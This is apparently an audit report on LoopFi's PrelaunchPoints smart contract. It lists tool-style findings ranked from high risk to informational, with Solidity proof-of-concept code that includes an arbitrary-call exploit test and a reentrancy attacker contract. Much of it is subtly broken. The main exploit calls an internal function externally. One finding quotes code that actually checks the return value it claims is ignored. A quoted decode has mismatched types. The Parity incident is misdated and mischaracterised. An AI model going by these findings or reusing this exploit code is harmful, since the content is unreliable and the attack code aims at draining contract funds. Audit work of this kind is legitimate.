  

---

# LoopFI Security Report For C4 Labs
 
  

### High-Risk Issues

#### 1. **Arbitrary ETH Sending (`arbitrary-send-eth`)**

-  **Description**:

The `_fillQuote` function in the Loopfi contract employs a low-level `call` to interact with an arbitrary address specified by `exchangeProxy`, executing any code contained in the `swapCallData`.

It's designed to facilitate various interactions within Loopf.One criticial functionality is users  borrowing ETH and participating in the decentralized finance (DeFi) ecosystem, with the `exchangeProxy` potentially playing a pivotal role in these processes.
  

However, this design introduces a significant risk: if the `exchangeProxy` is compromised or if the `swapCallData` contains malicious instructions, the function could execute unintended or harmful actions.

Given the capacity of `_fillQuote` to execute arbitrary code, the platform is vulnerable to unauthorized ETH transfers, state manipulations, and broader contract exploitation.

  

-  **Lines**: [584](src/PrelaunchPoints.sol#L530-L547)

-  **Code Context**:

```javascript

function  _fillQuote(IERC20  token, uint256  amount, bytes  memory  swapCallData) internal {

(bool success,) =  payable(exchangeProxy).call{ value: 0 }(swapCallData);

require(success, "Swap failed");

}

```

  

**Impact**:

-  **Unauthorized ETH Transfers**: 
	- The execution of arbitrary code through `swapCallData` can result in unintended ETH transfers. 
	-  An attacker could craft `swapCallData` to redirect ETH to their own address, potentially draining the project's ETH reserves. This vulnerability exposes the entire contract's ETH holdings to theft, posing a severe risk to the protocol and its users.

  

-  **State Manipulation**: 
	- The external contract invoked by `exchangeProxy` may alter its own or the calling contract's state in unforeseen ways. This could lead to unauthorized changes to user balances, critical configuration settings, or other sensitive data, compromising the integrity and security of the protocol. Such manipulation can cause widespread disruptions, affecting all users and transactions within the platform.

  

-  **Contract Exploitation**: 
	- Malicious actors can exploit vulnerabilities within the `exchangeProxy` contract, leveraging the arbitrary execution capabilities to gain unauthorized access to privileged functions or alter contract permissions.
	-   This could allow attackers to bypass security measures, execute restricted actions, or otherwise compromise the system's integrity, potentially leading to further financial losses or operational failures.

  

## **Real World Example**:

#### **Spectra Finance (2024)**

  

On July 23, 2024, Spectra Finance suffered a $550K loss due to an arbitrary call vulnerability in their router contract. This flaw allowed an attacker to drain all tokens approved to the contract.

  

More details can be found on [Spectra's Twitter update](https://x.com/spectra_finance/status/1815813300111786488) and the [BlockSec Explorer](https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744?line=7).

  

**Vulnerable Code Part:**

  

```javascript

else  if (command == Commands.KYBER_SWAP) {

(address kyberRouter,

address tokenIn,

uint256 amountIn,

address tokenOut,

bytes memory targetData) = abi.decode(_inputs, (address, address, uint256, address, uint256, bytes));

if (tokenOut == Constants.ETH) {

revert AddressError();

}

if (tokenIn == Constants.ETH) {

if (msg.value != amountIn) {

revert AmountError();

}

(bool success, ) = kyberRouter.call{value: msg.value}(targetData);

if (!success) {

revert CallFailed();

} else {

amountIn =  _resolveTokenValue(tokenIn, amountIn);

IERC20(tokenIn).forceApprove(kyberRouter, amountIn);

kyberRouter.call(targetData);

IERC20(tokenIn).forceApprove(kyberRouter, 0);

}

}

}

```

  

### PoC: How a malicious contract could exploit the `_fillQuote` function to cause financial loss or contract manipulation.

  

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol"; // Import the Forge testing library for unit tests
import "../src/PrelaunchPoints.sol"; // Import the PrelaunchPoints contract to be tested
import "../src/mock/MockERC20.sol"; // Import the MockERC20 contract for token mock-ups

contract TestArbitraryETHExploit is Test {
    // Declare state variables for contracts and addresses
    PrelaunchPoints public prelaunchPoints;
    MockERC20 public mockToken;
    MockERC20 public WETH;
    address public exchangeProxy = 0x01fd869eBC05D8aD3F65a978D0a1307D406Ce627; // Address for exchangeProxy, should be updated with the real address

    address[] public allowedTokens; // Array of allowed tokens for the PrelaunchPoints contract

    function setUp() public {
        // Deploy MockERC20 contracts for testing
        mockToken = new MockERC20("Mock Token", "MTK");
        WETH = new MockERC20("Wrapped ETH", "WETH");

        // Mint initial token supply to this contract
        mockToken.mint(address(this), 1000 * 10**18); // Mint 1000 tokens with 18 decimals
        WETH.mint(address(this), 1000 * 10**18); // Mint 1000 WETH tokens with 18 decimals

        // Add the deployed tokens to the allowedTokens array
        allowedTokens.push(address(mockToken));
        allowedTokens.push(address(WETH));

        // Deploy the PrelaunchPoints contract with the mock and allowed tokens
        prelaunchPoints = new PrelaunchPoints(
            exchangeProxy,          // Address for the exchange proxy
            address(WETH),          // Address for the WETH token
            allowedTokens           // Array of allowed tokens
        );

        // Approve the PrelaunchPoints contract to spend the tokens on behalf of this contract
        mockToken.approve(address(prelaunchPoints), 1000 * 10**18); // Allow PrelaunchPoints to spend mock tokens
        WETH.approve(address(prelaunchPoints), 1000 * 10**18); // Allow PrelaunchPoints to spend WETH tokens
    }

    function testArbitraryETHExploit() public {
        // Define the malicious swap data to exploit the vulnerability
        bytes memory swapData = abi.encodeWithSignature(
            "maliciousFunction(address,uint256)", // Function signature of the malicious function
            address(this), // Attacker's address to receive funds
            1 ether // Amount to withdraw (for demonstration purposes)
        );

        // Call the _fillQuote function with the crafted swapData
        (bool success, ) = address(prelaunchPoints).call(
            abi.encodeWithSignature(
                "_fillQuote(address,uint256,bytes)", // Function signature of _fillQuote
                address(mockToken), // Address of the token being swapped
                1000 * 10**18, // Amount of tokens to swap
                swapData // Malicious data to execute
            )
        );
        require(success, "Function call failed"); // Ensure the function call succeeded

        // Retrieve the token balances after the swap
        uint256 postSwapTokenBalance = mockToken.balanceOf(address(this)); // Balance of mock tokens after the swap
        uint256 postSwapWETHBalance = WETH.balanceOf(address(prelaunchPoints)); // Balance of WETH in PrelaunchPoints after the swap

        // Assertions to verify the results of the exploit
        assertEq(postSwapTokenBalance, 0, "Mock token balance should be zero after swap"); // Expect the token balance to be zero
        assertTrue(postSwapWETHBalance > 0, "WETH balance of PrelaunchPoints should be greater than zero after swap"); // Expect the WETH balance to have increased
    }
}


```

  

### Medium-Risk Issues

#### 1. **Uninitialized Local Variables (`uninitialized-local`)**

-  **Description**: Local variables are declared but not initialized before use. This can lead to unpredictable contract behavior because default values might be used in calculations or function calls, resulting in logical errors or unintended consequences.

-  **Lines**: [443-445](src/PrelaunchPoints.sol#L443-L445)

-  **Code Context**:

```javascript

address inputToken;

address outputToken;

uint256 inputTokenAmount;

```

-  **Impact**:

-  **Incorrect Calculations**: Uninitialized variables could lead to incorrect calculations or function calls. For example, if `inputToken` or `outputToken` is used in a function that requires valid addresses, using the default 0x0 address could cause errors or unexpected behavior in user interactions.

-  **Security Vulnerabilities**: Uninitialized variables used in security-sensitive operations might introduce vulnerabilities. If a function expects specific values and gets default or unintended ones, it might expose the contract to risks.

-  **Mitigation**:

- Initialize all local variables with appropriate default values before use. Validate that the values are correctly set before any operation that depends on them.

-  **PoC**: Show how using uninitialized variables can lead to failures or incorrect behavior in contract operations.

```javascript

// Contract demonstrating uninitialized variables

contract TestUninitialized {

PrelaunchPoints public prelaunchPoints;

constructor(address _prelaunchPoints) {

prelaunchPoints =  PrelaunchPoints(_prelaunchPoints);

}

function  testFunction() external {

address inputToken; // Uninitialized

address outputToken; // Uninitialized

uint256 inputTokenAmount; // Uninitialized

  
//  use the uninitialized variables
prelaunchPoints.someFunction(inputToken, outputToken, inputTokenAmount);

}

}

```

-  **Real-World Example**:

-  **Parity Multi-Sig Wallet** (2018): An uninitialized variable issue in the contract caused incorrect behavior, leading to the loss of significant funds. This incident underscores the importance of proper initialization and handling of contract state.

  

#### 2. **Unused Return Values (`unused-return`)**

-  **Description**: Ignoring the return values from functions that indicate success or failure can cause critical issues to go unnoticed. This might result in the contract operating under false assumptions or failing silently, leading to potential financial loss or incorrect contract behavior.

-  **Lines**: [260-298](src/PrelaunchPoints.sol#L260-L298)

-  **Code Context**:

```javascript

if (!_sellToken.approve(exchangeProxy, _amount)) {

revert SellTokenApprovalFailed();

}

```

-  **Impact**:

-  **Unnoticed Failures**: If the `approve` function fails and its return value is ignored, the contract might continue to function under the assumption that the approval was successful, which could lead to failed token transfers or other operations.

-  **Operational Risks**: Critical operations depending on the success of token approvals or other functions might fail silently, causing financial loss or unexpected states in the contract.

-  **Mitigation**:

- Ensure that all function calls that return values are handled appropriately. Validate the success of each operation and include error handling where necessary.

-  **PoC**: Show how ignoring return values can lead to silent failures in critical operations.

```javascript

// Contract demonstrating failure due to unused return values

contract TestUnusedReturn {

PrelaunchPoints public prelaunchPoints;

  

constructor(address _prelaunchPoints) {

prelaunchPoints =  PrelaunchPoints(_prelaunchPoints);

}

  

function  testFunction() external {

uint256 amount =  100;

address exchangeProxy =  address(0x123);

  

// Ignoring the return value of approve, leading to potential silent failure

// If approval fails, subsequent operations relying on this approval might also fail

prelaunchPoints._sellToken.approve(exchangeProxy, amount);

}

}

```



## Low-Risk Issues

  

### Low-Level Calls (`low-level-calls`)

  

-  **Description**: Low-level calls can be used to interact with contracts but might bypass some of the safety checks provided by Solidity's higher-level constructs.

-  **Files and Lines**:

-  `src/PrelaunchPoints.sol` [Lines: 530-547](src/PrelaunchPoints.sol#L530-L547)

```javascript

function  _fillQuote(IERC20  token, uint256  amount, bytes  memory  swapCallData) internal {

(bool success,) =  address(exchangeProxy).call{value: 0}(swapCallData);

require(success, "Swap failed");

}

```

*Explanation*: The use of low-level `call` can potentially lead to reentrancy attacks or unexpected behavior. Ensure that all external calls are handled securely.

  

-  **Impact**:

- Low-level calls can introduce risks such as reentrancy attacks if not properly managed.

  

-  **Mitigation**:

- Use high-level abstractions where possible and ensure thorough validation of all data and success indicators.

  

-  **Proof of Concept (PoC)**

  

The PoC demonstrates how low-level calls can be exploited through reentrancy attacks.

  

**Malicious Contract**

```javascript

// Malicious Contract

contract Malicious {

PrelaunchPoints public prelaunchPoints;

address public owner;

  

constructor(address _prelaunchPoints) {

prelaunchPoints =  PrelaunchPoints(_prelaunchPoints);

owner = msg.sender;

}

  

// Fallback function to reenter the _fillQuote function

receive() external payable {

if (address(prelaunchPoints).balance >  0) {

// Call _fillQuote again to exploit reentrancy

bytes memory swapCallData = abi.encodeWithSignature("someFunction()");

prelaunchPoints._fillQuote(IERC20(address(0)), 0, swapCallData);

}

}

  

function  exploit() external {

bytes memory swapCallData = abi.encodeWithSignature("someFunction()");

prelaunchPoints._fillQuote(IERC20(address(0)), 0, swapCallData);

}

}

```

  

**Contract Using PrelaunchPoints**

```javascript

// Contract using PrelaunchPoints

contract TestLowLevelCall {

PrelaunchPoints public prelaunchPoints;

Malicious public malicious;

  

constructor(address _prelaunchPoints, address _malicious) {

prelaunchPoints =  PrelaunchPoints(_prelaunchPoints);

malicious =  Malicious(_malicious);

}

  

function  testExploit() external {

// Trigger the exploit

malicious.exploit();

}

}

```

  

**Explanation**

  

- The **Malicious Contract** contains a fallback function that re-enters the `_fillQuote` function if the balance is greater than zero. This can exploit the low-level `call` to perform a reentrancy attack or other malicious actions.

  

- The **TestLowLevelCall Contract** initiates the exploit by calling the malicious contract's exploit function, which triggers the reentrant call.

  

**Mitigation**

  

-  **High-Level Abstractions**: Prefer using high-level functions and abstractions that provide built-in safety checks.

-  **Validation**: Validate all inputs and the success of external calls thoroughly.

-  **Reentrancy Guard**: Implement reentrancy guards to prevent reentrant attacks.

  

### Missing Zero-Checks (`missing-zero-check`)

  

-  **Description**: Checks for `address(0)` when assigning values are missing.

-  **Files and Lines**:

-  `src/PrelaunchPoints.sol` [Line: 337](src/PrelaunchPoints.sol#L337)

```javascript

proposedOwner = _owner;

```

*Explanation*: There should be a check to ensure `_owner` is not the zero address to avoid assigning an invalid owner.

  

-  `src/PrelaunchPoints.sol` [Line: 365](src/PrelaunchPoints.sol#L365)

```javascript

lpETH =  ILpETH(_loopAddress);

```

*Explanation*: Ensure `_loopAddress` is not `address(0)` to prevent assigning an invalid address.

  

-  `src/PrelaunchPoints.sol` [Line: 366](src/PrelaunchPoints.sol#L366)

```javascript

lpETHVault =  ILpETHVault(_vaultAddress);

```

*Explanation*: Similarly, `_vaultAddress` should be validated to avoid setting an invalid address.

  

-  **Impact**:

- Assigning an invalid address can lead to contract malfunction or loss of control.

-  **Mitigation**:

- Ensure that addresses are checked for zero value before assignment.

-  **PoC**: Demonstrate contract issues due to missing zero address checks.

  

```javascript

// Contract with missing zero address checks

contract TestZeroChecks {

address public proposedOwner;

address public lpETH;

address public lpETHVault;

  

function  setOwner(address  _owner) external {

proposedOwner = _owner; // Missing zero address check

}

  

function  setLoopAddresses(address  _loopAddress, address  _vaultAddress) external {

lpETH = _loopAddress; // Missing zero address check

lpETHVault = _vaultAddress; // Missing zero address check

}

}

```

  

### PUSH0 Compatibility (`push0-compatibility`)

  

-  **Description**: Solidity 0.8.20 introduces `PUSH0` which may have unintended effects.

-  **Files and Lines**:

-  `src/interfaces/ILpETHVault.sol` [Line: 2](src/interfaces/ILpETHVault.sol#L2)

```javascript

pragma solidity 0.8.20;

```

*Explanation*: Using a specific version pragma (0.8.20) can lead to compatibility issues if new opcodes like `PUSH0` are not handled correctly.

  

-  **Impact**:

- Potential issues with opcode compatibility and behavior.

-  **Mitigation**:

- Test contracts thoroughly with the specified Solidity version to ensure compatibility and handle any new opcodes appropriately.

-  **PoC**: Demonstrate potential issues with `PUSH0` opcode.

  

```javascript

// Contract demonstrating PUSH0 compatibility issues

pragma solidity 0.8.20;

  

contract TestPush0 {

function  testPush0() external  pure  returns (string  memory) {

return  "Test";

}

}

```

  
  

## Informationals

  

### Event Missing Indexed Fields (`event-missing-indexed-fields`)

  

-  **Description**: Events lack indexed fields, making them less efficient to query.

-  **Files and Lines**:

-  `src/PrelaunchPoints.sol` [Line: 53](src/PrelaunchPoints.sol#L53)

  

```javascript

event StakedVault(address user, uint256 amount, uint256 typeIndex);

  

```

*Explanation*: Adding `indexed` to the `user` parameter would make it easier to search and filter logs.

  

-  `src/PrelaunchPoints.sol` [Line: 146](src/PrelaunchPoints.sol#L146)

```javascript

event Converted(uint256 amountETH, uint256 amountlpETH);

```

*Explanation*: While this event has fewer parameters, indexing at least one would improve query efficiency.

  

-  **Impact**:

- Difficulty in filtering and querying events, leading to potential inefficiencies in event handling.

-  **Mitigation**:

- Add `indexed` to relevant fields in the events to facilitate efficient querying.

-  **PoC**: Show inefficient event querying due to missing indexed fields.

  

```javascript

// Contract with events missing indexed fields

contract TestEvents {

event StakedVault(address indexed user, uint256 amount, uint256 typeIndex);

event Converted(uint256 amountETH, uint256 amountlpETH);

  

function  stake(address  user, uint256  amount, uint256  typeIndex) external {

emit StakedVault(user, amount, typeIndex);

}

  

function  convert(uint256  amountETH, uint256  amountlpETH) external {

emit Converted(amountETH, amountlpETH);

}

}

```

### Unused Custom Error (`unused-custom-error`)

  

-  **Description**: Custom error definitions are not used in the contract.

-  **Files and Lines**:

-  `src/PrelaunchPoints.sol` [Line: 36](src/PrelaunchPoints.sol#L36)

```javascript

error FailedToSendEther();

```

*Explanation*: If custom errors are defined but not used, they should either be implemented in relevant places or removed to avoid confusion.

  

-  **Impact**:

- Unused code elements may lead to confusion and potential issues in code maintenance.

-  **Mitigation**:

- Implement the custom errors where applicable or remove them if not needed.

-  **PoC**: Show unused custom error in the contract.

```javascript

// Contract with unused custom error

contract TestCustomError {

error FailedToSendEther(); // Unused error

  

function  testFunction() external {

// Function logic here

}

}

  

```

  
  

### Solidity Pragma Specificity (`solidity-pragma`)

  

-  **Description**: Using a wide version of Solidity pragma.

-  **Files and Lines**:

-  `src/interfaces/IWETH.sol` [Line: 2](src/interfaces/IWETH.sol#L2)

```javascript

pragma solidity >=0.5.0;

```

*Explanation*: Using a broad version range in the pragma can lead to compatibility issues, as it may include versions that introduce unintended changes or bugs.

  

-  **Impact**:

- Potential compatibility issues with future Solidity versions.

-  **Mitigation**:

- Use a more specific Solidity version pragma to avoid unintended changes or bugs.

-  **PoC**: Show potential issues with a broad Solidity version pragma.

```javascript

// Contract with a broad Solidity version pragma

pragma solidity >=0.5.0;

  

contract TestPragma {

function  testFunction() external  pure  returns (string  memory) {

return  "Test";

}

}

```

  

---